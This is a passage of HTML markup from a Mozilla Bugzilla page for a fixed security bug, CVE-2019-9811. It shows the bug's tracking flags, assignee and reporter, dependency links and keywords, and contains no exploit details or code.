_tracking_firefox68&quot;:&quot;+&quot;,&quot;cf_status_firefox_esr78&quot;:&quot;---&quot;,&quot;cf_tracking_firefox66&quot;:&quot;+&quot;,&quot;cf_tracking_thunderbird_esr91&quot;:&quot;---&quot;,&quot;dupe_of&quot;:null,&quot;cf_tracking_firefox94&quot;:&quot;---&quot;}"></span>)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-tracking-content"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-status-view"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-view-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-view">RESOLVED
        FIXED
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-status-edit" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-edit-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-edit"><div class="field inline" id="field-bug_status"
>


  
    <div class="value">
        <span id="field-value-bug_status">
            RESOLVED

        </span>
    </div>

  
</div><div class="field indent inline" id="field-resolution"
>


  
    <div class="value">
        <span id="field-value-resolution">
            FIXED

        </span>
    </div>

  
</div>
  <div id="status-action-buttons">
      <div id="assigned-container" style="display:none">
        <button type="button" class="secondary" id="mark-as-assigned-btn">
          Mark as Assigned
        </button>
      </div>
  </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-target_milestone" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone" id="target_milestone-help-link" class="help">Milestone:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-target_milestone">
            ---

        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_iteration" style="display:none"
>
    <div class="name">Iteration:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_iteration">
            ---

        </span>
    </div>

  
</div>


      <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Project Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <td class="tracking-flag-name">a11y-review</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_a11y_review_project_flag-dirty">
  <select id="cf_a11y_review_project_flag" name="cf_a11y_review_project_flag">
        <option value="---"
          id="v4876_cf_a11y_review_project_flag" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Webcompat Priority</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_webcompat_priority-dirty">
  <select id="cf_webcompat_priority" name="cf_webcompat_priority">
        <option value="---"
          id="v4274_cf_webcompat_priority" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Root Cause</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_root_cause-dirty">
  <select id="cf_root_cause" name="cf_root_cause">
        <option value="---"
          id="v4701_cf_root_cause" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">user-doc-firefox</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_sumo-dirty">
  <select id="cf_tracking_firefox_sumo" name="cf_tracking_firefox_sumo">
        <option value="---"
          id="v4660_cf_tracking_firefox_sumo" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Fission Milestone</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_fission_milestone-dirty">
  <select id="cf_fission_milestone" name="cf_fission_milestone">
        <option value="---"
          id="v4222_cf_fission_milestone" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

      <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Tracking Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-hide">
    <table class="layout-table tracking-flags">
        <tr>
          <th></th>
          <th>Tracking</th>
          <th>Status</th>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr60</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox_esr60&amp;o1=equals&amp;v1=68%2B">68+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr68</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox66</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox66&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox66&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox67</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox67&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox67&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox68</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox68&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox69</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox69&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
    </table>
  </div>


<div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <th></th>
        <th>Tracking</th>
        <th>Status</th>
      </tr>
      <tr>
        <td class="tracking-flag-name">relnote-firefox</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_relnote-dirty">
  <select id="cf_tracking_firefox_relnote" name="cf_tracking_firefox_relnote">
        <option value="---"
          id="v539_cf_tracking_firefox_relnote" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr78-dirty">
  <select id="cf_tracking_thunderbird_esr78" name="cf_tracking_thunderbird_esr78">
        <option value="---"
          id="v4823_cf_tracking_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr78-dirty">
  <select id="cf_status_thunderbird_esr78" name="cf_status_thunderbird_esr78">
        <option value="---"
          id="v4829_cf_status_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr91-dirty">
  <select id="cf_tracking_thunderbird_esr91" name="cf_tracking_thunderbird_esr91">
        <option value="---"
          id="v5236_cf_tracking_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr91-dirty">
  <select id="cf_status_thunderbird_esr91" name="cf_status_thunderbird_esr91">
        <option value="---"
          id="v5242_cf_status_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr60</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr60-dirty">
  <select id="cf_tracking_firefox_esr60" name="cf_tracking_firefox_esr60">
        <option value="68+"
          id="v4249_cf_tracking_firefox_esr60" selected
        >68+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr60-dirty">
  <select id="cf_status_firefox_esr60" name="cf_status_firefox_esr60">
        <option value="fixed"
          id="v3636_cf_status_firefox_esr60" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr68</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr68-dirty">
  <select id="cf_status_firefox_esr68" name="cf_status_firefox_esr68">
        <option value="fixed"
          id="v4412_cf_status_firefox_esr68" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr78-dirty">
  <select id="cf_tracking_firefox_esr78" name="cf_tracking_firefox_esr78">
        <option value="---"
          id="v4808_cf_tracking_firefox_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr78-dirty">
  <select id="cf_status_firefox_esr78" name="cf_status_firefox_esr78">
        <option value="---"
          id="v4813_cf_status_firefox_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr91-dirty">
  <select id="cf_tracking_firefox_esr91" name="cf_tracking_firefox_esr91">
        <option value="---"
          id="v5194_cf_tracking_firefox_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr91-dirty">
  <select id="cf_status_firefox_esr91" name="cf_status_firefox_esr91">
        <option value="---"
          id="v5199_cf_status_firefox_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox66</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox66-dirty">
  <select id="cf_tracking_firefox66" name="cf_tracking_firefox66">
        <option value="+"
          id="v4100_cf_tracking_firefox66" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox66-dirty">
  <select id="cf_status_firefox66" name="cf_status_firefox66">
        <option value="wontfix"
          id="v4109_cf_status_firefox66" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox67</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox67-dirty">
  <select id="cf_tracking_firefox67" name="cf_tracking_firefox67">
        <option value="+"
          id="v4188_cf_tracking_firefox67" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox67-dirty">
  <select id="cf_status_firefox67" name="cf_status_firefox67">
        <option value="wontfix"
          id="v4197_cf_status_firefox67" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox68</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox68-dirty">
  <select id="cf_tracking_firefox68" name="cf_tracking_firefox68">
        <option value="+"
          id="v4252_cf_tracking_firefox68" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox68-dirty">
  <select id="cf_status_firefox68" name="cf_status_firefox68">
        <option value="fixed"
          id="v4260_cf_status_firefox68" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox69</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox69-dirty">
  <select id="cf_tracking_firefox69" name="cf_tracking_firefox69">
        <option value="+"
          id="v4323_cf_tracking_firefox69" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox69-dirty">
  <select id="cf_status_firefox69" name="cf_status_firefox69">
        <option value="fixed"
          id="v4331_cf_status_firefox69" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox93</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox93-dirty">
  <select id="cf_tracking_firefox93" name="cf_tracking_firefox93">
        <option value="---"
          id="v5266_cf_tracking_firefox93" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox93-dirty">
  <select id="cf_status_firefox93" name="cf_status_firefox93">
        <option value="---"
          id="v5271_cf_status_firefox93" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox94</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox94-dirty">
  <select id="cf_tracking_firefox94" name="cf_tracking_firefox94">
        <option value="---"
          id="v5284_cf_tracking_firefox94" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox94-dirty">
  <select id="cf_status_firefox94" name="cf_status_firefox94">
        <option value="---"
          id="v5289_cf_status_firefox94" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox95</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox95-dirty">
  <select id="cf_tracking_firefox95" name="cf_tracking_firefox95">
        <option value="---"
          id="v5311_cf_tracking_firefox95" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox95-dirty">
  <select id="cf_status_firefox95" name="cf_status_firefox95">
        <option value="---"
          id="v5316_cf_status_firefox95" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>

</div>
  </div>
</section>



<section class="module" id="module-people"
>
    <header id="module-people-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse People section"
           data-label-collapsed="Expand People section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-people-content"
             aria-expanded="false"
             aria-labeledby="module-people-title"
             aria-describedby="module-people-subtitle"></div>
        <h2 class="module-title" id="module-people-title">People</h2>
          <h3 class="module-subtitle" id="module-people-subtitle">
            (Reporter: Alex_Gaynor, Assigned: peterv)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-people-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-assigned_to"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to"><div class="vcard vcard_24295" ><img src="https://secure.gravatar.com/avatar/21a031df69f8c0549475a8cdc06f53f5?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=24295" > <span class="fna">peterv</span></a>
</div>
        </span>
    </div>

  
</div><div class="field edit-show" id="field-assigned_to" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-assignee" name="set_default_assignee" class="set-default"
          value="1" data-for="assigned_to">
        <label for="set-default-assignee">Reset Assignee to default</label>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-bug_mentors" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor" id="bug_mentors-help-link" class="help">Mentors:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_mentors">---
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-qa_contact" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact" id="qa_contact-help-link" class="help">QA Contact:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-qa_contact">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-qa-contact" name="set_default_qa_contact" class="set-default"
          value="1" data-for="qa_contact">
        <label for="set-default-qa-contact">Reset QA Contact to default</label>
      </div>
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-reporter"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter" id="reporter-help-link" class="help">Reporter:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-reporter">
            <div class="vcard vcard_537703" ><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex_Gaynor</span></a>
</div>

        </span>
    </div>

  
</div>

    <div class="field" id="field-triage_owner"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner" id="triage_owner-help-link" class="help">Triage Owner:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-triage_owner">
            <div class="vcard vcard_41270" ><img src="https://secure.gravatar.com/avatar/2b40751f36f992f741cd678fb4a4ae55?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=41270" > <span class="fna">zbraniecki</span></a>
</div>

        </span>
    </div>

  
</div>

    

    <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc" id="-help-link" class="help">CC:
        </a>
    </div>


  
    <div class=" container">


        <span aria-owns="cc-summary cc-latch">
          <span role="button" tabindex="0" id="cc-summary" data-count="44">44 people
          </span>
        </span>


        <div id="cc-list" style="display:none"></div>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-references"
>
    <header id="module-references-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse References section"
           data-label-collapsed="Expand References section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-references-content"
             aria-expanded="false"
             aria-labeledby="module-references-title"
             aria-describedby="module-references-subtitle"></div>
        <h2 class="module-title" id="module-references-title">References</h2>
      </div>
    </header>
  <div class="module-content" id="module-references-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field bug-list" id="field-dependson"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson" id="dependson-help-link" class="help">Depends on:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-dependson">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Parent process should prompt when installing a language pack"
   href="/show_bug.cgi?id=1539590">1539590</a>, <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Consider an origin-whitelist for early site isolation for AMO and accounts.firefox.com"
   href="/show_bug.cgi?id=1539595">CVE-2019-11741</a>, <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Re-Enable Mozilla Content Process Isolation"
   href="/show_bug.cgi?id=1557074">1557074</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Prevent users from uploading langpacks containing exploits to AMO"
   href="/show_bug.cgi?id=1563327">1563327</a>
      </div>
      <div class="bug-list">
        <span class="bug-type-label iconic" title="enhancement"
              aria-label="enhancement" data-type="enhancement">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Convert aboutTelemetry.dtd to use Fluent instead"
   href="/show_bug.cgi?id=1523741">1523741</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED WONTFIX - Remove special navigator.mozAddonManager API from addons.mozilla.org"
   href="/show_bug.cgi?id=1539591">1539591</a>
      </div>
      <div class="bug-list">
        <span class="bug-type-label iconic" title="task"
              aria-label="task" data-type="task">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Convert consumers using inline HTML markup in browser.dtd to fluent and/or to not use inline markup"
   href="/show_bug.cgi?id=1539758">1539758</a>, <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Stop allowing markup injection via DTD in system-privileged contexts"
   href="/show_bug.cgi?id=1539759">1539759</a>
      </div>

        </span>
    </div>

  
</div><div class="field bug-list" id="field-blocked"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks" id="blocked-help-link" class="help">Blocks:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-blocked">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="enhancement"
              aria-label="enhancement" data-type="enhancement">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - [meta] pwn2own 2019"
   href="/show_bug.cgi?id=1539818">pwn2own-2019</a>
      </div>

        </span>
    </div>

  
</div><div class="field" id="field-dependencytree"
>
    <div class="name">
    </div>


  
    <div class=" container">
        <span id="field-value-dependencytree">
        Dependency <a href="/showdependencytree.cgi?id=1538007&amp;hide_resolved=1">tree</a>
        / <a href="/showdependencygraph.cgi?id=1538007">graph</a>
        </span>
    </div>

  
</div>

    <div class="field bug-list edit-show" id="field-regresses" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses" id="regresses-help-link" class="help">Regressions:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regresses">
        ---
        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-regressed_by" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by" id="regressed_by-help-link" class="help">Regressed by:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regressed_by">
        ---
        </span>
    </div>

  
</div>

    
</div><div class="fields-rhs">

    <div class="field edit-show" id="field-bug_file_loc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc" id="bug_file_loc-help-link" class="help">URL:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_file_loc"><div class="link">
    <a href="" target="_blank"
      rel="noreferrer" title=""
      class="bug-url" data-safe="0"></a>
  </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-see_also" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also" id="see_also-help-link" class="help">See Also:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-see_also">
        ---
        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-details"
>
    <header id="module-details-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Details section"
           data-label-collapsed="Expand Details section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-details-content"
             aria-expanded="false"
             aria-labeledby="module-details-title"
             aria-describedby="module-details-subtitle"></div>
        <h2 class="module-title" id="module-details-title">Details</h2>
          <h3 class="module-subtitle" id="module-details-subtitle">
            (Keywords: csectype-priv-escalation, csectype-sandbox-escape, sec-high, Whiteboard: [adv-main68+][adv-esr60.8+])
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-details-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-show" id="field-alias" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias" id="alias-help-link" class="help">Alias:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-alias">
            CVE-2019-9811

        </span>
    </div>

  
</div>

    <div class="field" id="field-keywords"
>
    <div class="name">
        <a href="/describekeywords.cgi" id="keywords-help-link" class="help">Keywords:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-keywords">
          <a href="/buglist.cgi?keywords=csectype-priv-escalation&amp;resolution=---">csectype-priv-escalation</a>, 
          <a href="/buglist.cgi?keywords=csectype-sandbox-escape&amp;resolution=---">csectype-sandbox-escape</a>, 
          <a href="/buglist.cgi?keywords=sec-high&amp;resolution=---">sec-high</a>
        </span>
    </div>

  
</div>

    <div class="field" id="field-status_whiteboard"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/Whiteboard" id="status_whiteboard-help-link" class="help">Whiteboard:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-status_whiteboard">[adv-main68+][adv-esr60.8+]
        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_qa_whiteboard" style="display:none"
>
    <div class="name">QA Whiteboard:
    </div>


  
    <div class="value">
        <span id="field-value-cf_qa_whiteboard">
        ---
        </span>
    </div>

  
</div>

    

    <div class="field edit-show" id="field-cf_has_regression_range" style="display:none"
>
    <div class="name">Has Regression Range:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_regression_range">
            ---

        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_has_str" style="display:none"
>
    <div class="name">Has STR:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_str">
            ---

        </span>
    </div>

  
</div>

    <div class="field" id="field-votes"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes" id="votes-help-link" class="help">Votes:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-votes">0
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field edit-show" id="field-bug_flags" style="display:none"
>
    <div class="name">Bug Flags:
    </div>


  
    <div class=" container">
        <span id="field-value-bug_flags"><div id="bug-flags" class="flags">
  <table class="layout-table">
    <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?" for="flag_type-930">behind-pref</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-930-dirty">
      <select id="flag_type-930" name="flag_type-930"
        title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?"
        class="bug-flag">
          <option value="X"></option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag tracking inclusion in the desktop Firefox product backlog." for="flag_type-846">firefox-backlog</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-846-dirty">
      <select id="flag_type-846" name="flag_type-846"
        title="Flag tracking inclusion in the desktop Firefox product backlog."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug." for="flag_type-803">sec-bounty</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-803-dirty">
      <select id="flag_type-803" name="flag_type-803"
        title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame." for="flag_type-913">sec-bounty-hof</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-913-dirty">
      <select id="flag_type-913" name="flag_type-913"
        title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-787">in-qa-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-787-dirty">
      <select id="flag_type-787" name="flag_type-787"
        title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>

      <td class="flag-requestee">
        <div id="requestee_type-787-container" style="display:none"><input
    name="requestee_type-787"
    value="" class="requestee bz_autocomplete_user"  id="requestee_type-787" 
  >
        </div>
      <td>

  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-37">in-testsuite</label>
    </td>

    <td class="flag-value">
